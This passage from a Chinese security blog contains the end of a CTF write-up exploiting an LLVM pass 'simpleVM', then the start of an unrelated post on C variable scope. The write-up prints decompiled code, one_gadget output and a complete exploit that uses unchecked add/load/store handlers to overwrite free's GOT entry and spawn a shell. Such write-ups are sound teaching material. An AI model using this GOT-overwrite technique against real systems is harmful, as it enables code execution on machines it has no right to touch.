*)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::getName(CalledFunction);</span><br><span class="line">        *(_QWORD *)name = *Name;</span><br><span class="line">        *((_QWORD *)name + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)name + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)name + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_pop = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_pop = <span class="number">0LL</span>;</span><br><span class="line">            key_pop = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_pop);</span><br><span class="line">            <span class="keyword">if</span> ( key_pop )</span><br><span class="line">            &#123;</span><br><span class="line">              op_pop = llvm::ConstantInt::getZExtValue(key_pop);</span><br><span class="line">              <span class="keyword">if</span> ( op_pop == <span class="number">1</span> )</span><br><span class="line">                reg_pop = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_pop == <span class="number">2</span> )</span><br><span class="line">                reg_pop = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_pop )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = stack_s;</span><br><span class="line">              *reg_pop = *(_QWORD *)*stack_s;</span><br><span class="line">              *v3 = (<span class="keyword">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_push = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_push = <span class="number">0LL</span>;</span><br><span class="line">            key_push = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_push);</span><br><span class="line">            <span class="keyword">if</span> ( key_push )</span><br><span class="line">            &#123;</span><br><span class="line">              op_push = llvm::ConstantInt::getZExtValue(key_push);</span><br><span class="line">              <span class="keyword">if</span> ( op_push == <span class="number">1</span> )</span><br><span class="line">                reg_push = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_push == <span class="number">2</span> )</span><br><span class="line">                reg_push = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_push )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = stack_s;</span><br><span class="line">              *stack_s = (<span class="keyword">char</span> *)*stack_s + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *reg_push;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_store = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_store = <span class="number">0LL</span>;</span><br><span class="line">            key_store = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_store);</span><br><span class="line">            <span class="keyword">if</span> ( key_store )</span><br><span class="line">            &#123;</span><br><span class="line">              op_store = llvm::ConstantInt::getZExtValue(key_store);</span><br><span class="line">              <span class="keyword">if</span> ( op_store == <span class="number">1</span> )</span><br><span class="line">                reg_store = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_store == <span class="number">2</span> )</span><br><span class="line">                reg_store = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_store == register1 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)register1 = *(_QWORD *)register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( reg_store == register2 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)register2 = *(_QWORD *)register1;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_load = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_load = <span class="number">0LL</span>;</span><br><span class="line">            key_load = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_load);</span><br><span class="line">            <span class="keyword">if</span> ( key_load )</span><br><span class="line">            &#123;</span><br><span class="line">              op_load = llvm::ConstantInt::getZExtValue(key_load);</span><br><span class="line">              <span class="keyword">if</span> ( op_load == <span class="number">1</span> )</span><br><span class="line">                reg_load = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_load == <span class="number">2</span> )</span><br><span class="line">                reg_load = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_load == register1 )</span><br><span class="line">              *(_QWORD *)register2 = **(_QWORD **)register1;</span><br><span class="line">            <span class="keyword">if</span> ( reg_load == register2 )</span><br><span class="line">              *(_QWORD *)register1 = **(_QWORD **)register2;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_add = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_add = <span class="number">0LL</span>;</span><br><span class="line">            key_add = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_add);</span><br><span class="line">            <span class="keyword">if</span> ( key_add )</span><br><span class="line">            &#123;</span><br><span class="line">              op_add = llvm::ConstantInt::getZExtValue(key_add);</span><br><span class="line">              <span class="keyword">if</span> ( op_add == <span class="number">1</span> )</span><br><span class="line">                reg_add = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_add == <span class="number">2</span> )</span><br><span class="line">                reg_add = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_add )</span><br><span class="line">            &#123;</span><br><span class="line">              ArgOp_add2 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">              key_add2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_add2);</span><br><span class="line">              <span class="keyword">if</span> ( key_add2 )</span><br><span class="line">                *reg_add += llvm::ConstantInt::getZExtValue(key_add2);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ArgOp_min = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">          reg_min = <span class="number">0LL</span>;</span><br><span class="line">          key_min = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_min);</span><br><span class="line">          <span class="keyword">if</span> ( key_min )</span><br><span class="line">          &#123;</span><br><span class="line">            op_min = llvm::ConstantInt::getZExtValue(key_min);</span><br><span class="line">            <span class="keyword">if</span> ( op_min == <span class="number">1</span> )</span><br><span class="line">              reg_min = register1;</span><br><span class="line">            <span class="keyword">if</span> ( op_min == <span class="number">2</span> )</span><br><span class="line">              reg_min = register2;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( reg_min )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_min2 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">            key_min2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_min2);</span><br><span class="line">            <span class="keyword">if</span> ( key_min2 )</span><br><span class="line">              *reg_min -= llvm::ConstantInt::getZExtValue(key_min2);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(name);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Cpp 看得我好难受，连蒙带猜可以推断出它的意思：</p>
<ul>
<li>先从函数的第二个参数传入 BasicBlock</li>
<li>通过 <code>llvm::Value::getName</code> 获取 name</li>
<li>把 name 和各种命令进行对比：pop，push，add……</li>
<li>紧接着就执行了 <code>llvm::CallBase::getArgOperand(v35, 0)</code> ，从名字来看，它获取了一个叫做 ArgOperand 的东西（看上去像是某种操作数）</li>
<li>然后把 ArgOperand 作为参数，执行了 <code>llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_pop)</code> ，因为返回值的类型为 <code>llvm::ConstantInt *</code> ，看名字和“常量整数”有关，所以猜测这个函数和C语言中的 “atoi” 类似</li>
<li>然后执行 <code>llvm::ConstantInt::getZExtValue(key_pop)</code> ，获取了整形的 ZExtValue，从后续的 if 语句来看，这个值极有可能是“1”或者“2”</li>
<li>最后对比 op_command 的值，选择把 reg_command 赋值为 register1 或者 register2</li>
</ul>
<p>漏洞点如下：</p>
<p>ADD 指令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( reg_add )</span><br><span class="line">&#123;</span><br><span class="line">  ArgOp_add2 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">  key_add2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_add2);</span><br><span class="line">  <span class="keyword">if</span> ( key_add2 )</span><br><span class="line">    *reg_add += llvm::ConstantInt::getZExtValue(key_add2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里匹配到 <code>add</code> 指令时，会根据其 “操作数1” 的值，来选择对应的 register，将 “操作数2” 累加上去</li>
<li>可以通过 <code>add</code> 改变 register1 和 register2（它们的初始值为“0”）</li>
</ul>
<p>LOAD 指令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( reg_load == register1 )</span><br><span class="line">  *(_QWORD *)register2 = **(_QWORD **)register1;</span><br><span class="line"><span class="keyword">if</span> ( reg_load == register2 )</span><br><span class="line">  *(_QWORD *)register1 = **(_QWORD **)register2;</span><br></pre></td></tr></table></figure>
<ul>
<li>当匹配到 <code>load</code> 指令时，将对应的 register 中的值看做是地址，从该地址中取出8字节数据存入另一个 register 中（把二级指针中的数据放入一级指针中）</li>
<li>register1 和 register2 的值完全由 <code>add</code> 控制，并且没有 <code>load</code> 中没有检查边界</li>
</ul>
<p>STORE 指令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( reg_store == register1 )</span><br><span class="line">&#123;</span><br><span class="line">  **(_QWORD **)register1 = *(_QWORD *)register2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( reg_store == register2 )</span><br><span class="line">&#123;</span><br><span class="line">  **(_QWORD **)register2 = *(_QWORD *)register1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当匹配到 <code>store</code> 指令时，就执行和 <code>load</code> 指令相反的操作，同样没有检查边界</li>
<li>所以 <code>add</code>，<code>load</code>，<code>store</code> 相互配合，就可以实现 WAA</li>
</ul>
<p>入侵思路为：</p>
<ul>
<li>将 <code>opt-8</code> 二进制程序的 GOT 表中的 free 表项改为 one_gadget，即可获得 shell</li>
</ul>
<p>获取 one_gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.2</span>)</span> stable release version 2.27</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">➜  simpleVM one_gadget libc.so -l2</span><br><span class="line"><span class="number">0x4f365</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; <span class="number">0xf</span> == <span class="number">0</span></span><br><span class="line">  rcx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4f3c2</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x40</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe56ff</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r14, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r14] == <span class="literal">NULL</span> || r14 == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe58b8</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, [rbp<span class="number">-0x88</span>], [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [[rbp<span class="number">-0x88</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x88</span>] == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe58bf</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [r10] == <span class="literal">NULL</span> || r10 == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe58c3</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r10] == <span class="literal">NULL</span> || r10 == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a45c</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a468</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [[rax]] == <span class="literal">NULL</span> || [rax] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>获取 free GOT 表：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./opt-8&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./opt-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;free_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_got))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting local process <span class="string">&#x27;./opt-8&#x27;</span> argv=[<span class="string">&#x27;./opt-8&#x27;</span>] : pid <span class="number">3696</span></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/simpleVM/opt-8&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">[+] free_got &gt;&gt; <span class="number">0x77e100</span></span><br><span class="line">[*] Switching to interactive mode</span><br></pre></td></tr></table></figure>
<p>完整 exp 为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">o0o0o0o0</span><span class="params">()</span></span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>); <span class="comment">// 0x77e100: free_GOT</span></span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x72a9c</span>); <span class="comment">// 0x72a9c: one_gadget和free_addr之间的偏移</span></span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>add(1, 0x77e100)</code> 会在 register1 中写入 free_GOT</li>
<li><code>load(1)</code> 会把 free_GOT 中的 free_addr（二级指针）装入 register2（一级指针）</li>
<li><code>add(2, 0x72a9c)</code> 会把 register2 中的 free_addr 变为 one_gadget</li>
<li><code>store(1)</code> 会把 register2 中的 one_gadget（一级指针），装入 register1 中的 free_GOT 中（二级指针）</li>
</ul>
<p>最后执行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  simpleVM clang -emit-llvm -S <span class="built_in">exp</span>.c -o <span class="built_in">exp</span>.ll</span><br><span class="line">➜  simpleVM ./opt<span class="number">-8</span> -load ./VMPass.so -VMPass ./<span class="built_in">exp</span>.ll</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：当我尝试利用 patchelf 修改 opt-8 的 libc 版本时，我遇到了各种各样的报错，最后还是没法解决，干脆就算了</li>
</ul>
<hr>
<p><strong>小结：</strong></p>
<p>这是我第一次搞 LLVM pwn，感觉就是 Cpp 的代码有点难看，程序逻辑还是可以理解</p>
<p>我对于 LLVM 的理解是：</p>
<ul>
<li><strong>在执行优化操作之前，先把代码转化为 LLVM 的中间表示 IR，然后对 IR 进行优化，最后交给后端翻译为机器码</strong></li>
</ul>
<p>本题目的问题就出在 LLVM IR 的优化，也就是 LLVM pass</p>
<p>用 IDA 分析发现：VMPass.so 有大量“指令函数”（add，load，store ……），这些函数就是优化的目标，漏洞也是在优化的过程中出现的</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/03/C&Cpp%E6%9D%82%E8%B0%88/" class="post-title-link" itemprop="url">C&Cpp杂谈（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-03 14:10:19 / Modified: 14:51:55" itemprop="dateCreated datePublished" datetime="2022-06-03T14:10:19+08:00">2022-06-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="C语言-作用域"><a href="#C语言-作用域" class="headerlink" title="C语言-作用域"></a>C语言-作用域</h2><p><strong>作用域简析</strong></p>
<p>所谓作用域，就是变量的有效范围，即变量可以在哪个范围以内使用</p>
<p>​        // 有些变量可以在所有代码文件中使用，有些变量只能在当前的文件中使用，有些变量只能在函数内部使用，有些变量只能在 for 循环内部使用</p>
<p>变量的作用域由变量的定义位置决定，在不同位置定义的变量，它的作用域是不一样的 </p>
<p>C语言编译器可以确认四种不同类型的作用域：</p>
<ul>
<li>代码块作用域（代码块是{}之间的一段代码）</li>
<li>文件作用域</li>
<li>原型作用域</li>
<li>函数作用域（局部变量）</li>
</ul>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_35712811/article/details/117015194">C语言总结之变量的种类</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiangsikai/p/12378680.html">C语言 作用域</a> </p>
<p><strong>常见的代码块作用域</strong></p>
<p>一，如：“if(){}”，“while(){}”，“switch(){ case 1:{}……}”等各种情况的{}即块作用作用域，在{}中定义的变量，作用域仅限定在{}中</p>
<p>换句话说，在代码块内部定义的变量只能在代码块内部使用，出了代码块就无效了 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;  <span class="comment">//也可以写作 int gcd(int, int);</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The greatest common divisor is %d\n&quot;</span>, gcd(<span class="number">100</span>, <span class="number">60</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="comment">//若a&lt;b，那么交换两变量的值</span></span><br><span class="line">    <span class="keyword">if</span>(a &lt; b)&#123;</span><br><span class="line">        <span class="keyword">int</span> temp1 = a;  <span class="comment">//块级变量</span></span><br><span class="line">        a = b;</span><br><span class="line">        b = temp1;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">//求最大公约数</span></span><br><span class="line">    <span class="keyword">while</span>(b!=<span class="number">0</span>)&#123;</span><br><span 